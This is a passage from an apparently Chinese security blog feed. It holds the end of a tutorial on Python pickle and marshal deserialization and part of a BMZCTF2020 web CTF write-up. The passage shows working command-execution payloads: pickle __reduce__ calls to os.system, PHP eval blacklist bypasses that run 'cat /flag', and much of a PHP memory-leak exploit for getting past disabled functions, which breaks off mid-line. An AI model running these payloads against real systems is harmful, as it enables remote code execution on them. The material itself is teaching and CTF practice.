class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204400.png" alt=""></p><p>再来看一个最简单的利用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>很明显，反序列化的参数是可控的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">             <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">      </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br></pre></td></tr></table></figure><h2 id="0x03-Marshal反序列化">0x03 Marshal反序列化</h2><p>现在看看还有啥别的序列化库。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103205604.png" alt=""></p><p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。</p><p>这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))</span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, globals(), <span class="string">&#x27;&#x27;</span>)()</span><br><span class="line">print(code_unserialized)</span><br></pre></td></tr></table></figure><p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&#39;YwAAA...&#39;           #code对象序列化编码</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&#39;&#39;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure><p>利用方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo()))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103211313.png" alt=""></p><p>在pickle下尝试执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;6QAAAAA=&#x27;   #whomai</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span></span><br><span class="line">data = pickle.loads(payload)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>于是又有一个黑名单绕过执行函数的方式。</p><h2 id="0x04-Others">0x04 Others</h2><p>当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。</p><p><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://misakikata.github.io/2020/04/python-反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python反序列化漏洞&quot;&gt;Python反序列化漏洞&lt;/h1&gt;
&lt;p&gt;这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等
      
    
    </summary>
    
    
      <category term="Web基础安全学习" scheme="http://ca0y1h.top/categories/Web%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="反序列化" scheme="http://ca0y1h.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>BMZCTF2020-Web-WriteUp</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp/</id>
    <published>2021-01-03T09:12:56.000Z</published>
    <updated>2021-01-03T09:13:21.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BMZCTF2020-Web-WriteUp">BMZCTF2020 Web WriteUp</h1><h2 id="0x01-easyeval">0x01 easyeval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$cmd=htmlspecialchars($cmd);</span><br><span class="line">$black_list=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>);</span><br><span class="line">$cmd = str_ireplace($black_list,<span class="string">&quot;BMZCTF&quot;</span>,$cmd);</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>拼接绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;t&#39;.&#39;e&#39;.&#39;m&#39;)(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><p><strong>十六进制绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;hex2bin(&#39;73797374656d&#39;)(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><p><strong>异或</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(ord(i)^ord(j) == ord(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(tmp1,tmp2)</span><br></pre></td></tr></table></figure><p><strong>取反</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x02-easyphp">0x02 easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen($cmd) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看一下phpinfo的内容，PHP版本7.3，禁掉了很多函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201230185957.png" alt=""></p><p>蚁剑的绕过方式都失败了，参考脚本https://xz.aliyun.com/t/8355</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a = str_repeat(<span class="string">&quot;T&quot;</span>, <span class="number">120</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params">&amp;$a, $p, $i, $x = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt; $x;$j++) &#123;</span><br><span class="line">        $a[$p + $j] = chr($i &amp; <span class="number">0xff</span>);</span><br><span class="line">        $i &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; strlen($s);$x++) &#123;</span><br><span class="line">        $result &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $result |= ord($s[$x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $s;</span><br><span class="line">    i2s($a, <span class="number">0x00</span>, $address - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> strlen($s -&gt; current());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPHPChunk</span>(<span class="params">$maps</span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;</span><br><span class="line">    preg_match_all($pattern, $maps, $match);</span><br><span class="line">    <span class="keyword">foreach</span> ($match[<span class="number">1</span>] <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">list</span>($start, $end) = explode(<span class="string">&quot;-&quot;</span>, $value);</span><br><span class="line">        <span class="keyword">if</span> (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) &gt;= <span class="number">0x200000</span> &amp;&amp; $length &lt;= <span class="number">0x300000</span>) &#123;</span><br><span class="line">            $address = <span class="keyword">array</span>(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[+]PHP Chunk: &quot;</span> . $start . <span class="string">&quot; - &quot;</span> . $end . <span class="string">&quot;, length: 0x&quot;</span> . dechex($length) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> $address;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb1</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (leak($a, s2i($_GET[<span class="string">&quot;test1&quot;</span>])) === <span class="number">0x5454545454545454</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (s2i($_GET[<span class="string">&quot;test1&quot;</span>]) &amp; <span class="number">0x7ffff0000000</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;[!]Where is here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bomb2</span>(<span class="params">&amp;$a</span>) </span>&#123;</span><br><span class="line">    $start = s2i($_GET[<span class="string">&quot;test2&quot;</span>]);</span><br><span class="line">    <span class="keyword">return</span> getElement($a, <span class="keyword">array</span>($start, $start + <span class="number">0x200000</span>, <span class="number">0x200000</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;[!]Not Found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElement</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($x = <span class="number">0</span>;$x &lt; ($address[<span class="number">2</span>] / <span class="number">0x1000</span> - <span class="number">2</span>);$x++) &#123;</span><br><span class="line">        $addr = <span class="number">0x108</span> + $address[<span class="number">0</span>] + <span class="number">0x1000</span> * $x + <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">for</span> ($y = <span class="number">0</span>;$y &lt; <span class="number">5</span>;$y++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leak($a, $addr + $y * <span class="number">0x08</span>) === <span class="number">0x1234567812345678</span> &amp;&amp; ((leak($a, $addr + $y * <span class="number">0x08</span> - <span class="number">0x08</span>) &amp; <span class="number">0xffffffff</span>) === <span class="number">0x01</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . dechex($addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> $addr + $y * <span class="number">0x08</span> - <span class="number">0x18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosureChunk</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $address = leak($a, $address);</span><br><span class="line">    &#125;<span class="keyword">while</span>(leak($a, $address) !== <span class="number">0x00</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+]Closure Chunk: &quot;</span> . dechex($address) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSystem</span>(<span class="params">&amp;$a, $address</span>) </span>&#123;</span><br><span class="line">    $start = $address &amp; <span class="number">0xffffffffffff0000</span>;</span><br><span class="line">    $lowestAddr = ($address &amp; <span class="number">0x0000fffffff00000</span>) - <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span> * <span class="number">0x80</span>; $i++) &#123;</span><br><span class="line">        $addr = $start - $i * <span class="number">0x20</span>;</span><br><span class="line">        <span class="keyword">if</span> ($addr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $nameAddr = leak($a, $addr);</span><br><span class="line">        <span class="keyword">if</span> ($nameAddr &gt; $address || $nameAddr &lt; $lowestAddr) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $name = dechex(leak($a, $nameAddr));</span><br><span class="line">        $name = str_pad($name, <span class="number">16</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">        $name = strrev(hex2bin($name));</span><br><span class="line">        $name = explode(<span class="string">&quot;\x00&quot;</span>, $name)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>($name === <span class="string">&quot;system&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leak($a, $addr + <span 